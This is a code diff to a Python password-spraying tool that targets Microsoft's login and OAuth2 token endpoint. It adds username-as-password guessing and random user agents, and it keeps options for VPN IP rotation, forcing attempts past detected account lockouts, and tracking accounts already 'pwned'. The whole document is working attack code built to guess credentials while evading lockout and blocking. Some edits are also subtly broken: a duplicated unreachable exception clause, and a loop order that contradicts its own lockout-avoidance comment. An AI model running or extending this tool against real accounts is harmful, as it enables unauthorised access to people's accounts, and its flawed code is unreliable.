@@ -4,7 +4,7 @@ import time
 import datetime
 import sys
 from nordvpn_switcher import initialize_VPN,terminate_VPN
-from utils import configure_logger, random_time, userlist, passwordlist, targetlist, safe_rotate_vpn, get_public_ip, excptn, init_db, log_event, has_user_password_been_tested, has_user_been_pwned
+from utils import configure_logger, make_session, random_time, userlist, passwordlist, targetlist, safe_rotate_vpn, get_public_ip, excptn, init_db, log_event, has_user_password_been_tested, has_user_been_pwned
 
 def args_parse():
     description = """
@@ -29,13 +29,13 @@ def args_parse():
     user_group.add_argument('-u', '--user', help="Single email to test")
     pass_group.add_argument('-p', '--password', help="Single password to test")
     pass_group.add_argument('-P', '--passwordlist', help="Password list to test, one password per line")
+    pass_group.add_argument("--userAsPass", action=argparse.BooleanOptionalAction, help="Use username as password")
     sleep_group.add_argument('-s', '--sleep', type=int, help="Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0", default=0)
     sleep_group.add_argument('-r', '--random', nargs=2, type=int, metavar=('minimum_sleep', 'maximum_sleep'), help="Randomize the time between each authentication attempt. Please provide minimum and maximum values in seconds")
     parser.add_argument('-t', '--target', default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
     parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password", default=False)
-    parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
+    parser.add_argument("-f", "--force", action=argparse.BooleanOptionalAction, help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
     parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
-    parser.add_argument("--userAsPass", action=argparse.BooleanOptionalAction, help="Use username as password")
     parser.add_argument('--skip-tested', action='store_true', help="Skip user:password already tried and logged in the DB")
     parser.add_argument('--ignore-success', action='store_true', help="Skip user already pwned in the DB")
     parser.add_argument("--vpn-area", default="Europe", help="VPN Zone(s) to use (ex: --vpn-area France,Germany,Netherlands,United Kingdom). Défaut: Europe.")
@@ -47,11 +47,13 @@ def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, 
     prev_ip = initial_ip
     lockout_counter = 0
     lockout_question = False
-    total_attempts = len(usernames) * len(passwords) * len(targets)
-    
+    total_attempts = len(usernames) * len(usernames if userAsPass else passwords) * len(targets)
+
     for target in targets:
-        for password in passwords:
-            for username in usernames:
+        for username in usernames:
+            if (userAsPass):
+                    passwords = [username.split('@')[0]]
+            for password in passwords:  # trying one password against each user, less likely to lockout users
                 if ignore_success:
                     try:
                         already = has_user_been_pwned(username)
@@ -81,33 +83,23 @@ def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, 
                         LOGGER.warning("[VPN] Rotation failed — exiting")
                         sys.exit(1)
 
-                if userAsPass:
-                    body = {
+                body = {
                     'resource': 'https://graph.windows.net',
                     'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
                     'client_info': '1',
                     'grant_type': 'password',
                     'username': username,
-                    'password': username.split('@')[0],
+                    'password': password,
                     'scope': 'openid',
                 }
-                else:
-                    body = {
-                        'resource': 'https://graph.windows.net',
-                        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
-                        'client_info': '1',
-                        'grant_type': 'password',
-                        'username': username,
-                        'password': password,
-                        'scope': 'openid',
-                    }
 
                 headers = {
                     'Accept': 'application/json',
                     'Content-Type': 'application/x-www-form-urlencoded',
                 }
 
-                r = requests.post(f"{target}/common/oauth2/token", headers=headers, data=body)
+                session = make_session(random_ua=True)
+                r = session.post(f"{target}/common/oauth2/token", headers=headers, data=body)
                 ip = get_public_ip(timeout=5, retries=2)
 
                 if r.status_code == 200:
@@ -164,6 +156,7 @@ def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, 
                         LOGGER.error(f"Got an error we haven't seen yet for user {username}")
                         log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="Got an error we haven't seen yet for user.")
                         LOGGER.error(error)
+                session.close()
 
                 if random is True:  # let's wait between attempts
                     sleep_time = random_time(min_sleep, max_sleep)
@@ -224,6 +217,8 @@ def main():
             passwords = passwordlist(args.passwordlist)
         except Exception as err:
             excptn(err)
+        except Exception as err:
+            excptn(err)
     if args.target:
             try:
                 targets = [args.target]
@@ -236,7 +231,7 @@ def main():
             excptn(err)
 
     total_accounts = len(usernames)
-    total_passwords = len(passwords)
+    total_passwords = len(usernames if args.userAsPass else passwords)
     total_targets = len(targets)
     total_attempts = total_accounts * total_passwords * total_targets
     LOGGER.info("Total number of users to test: %s" % str(total_accounts))
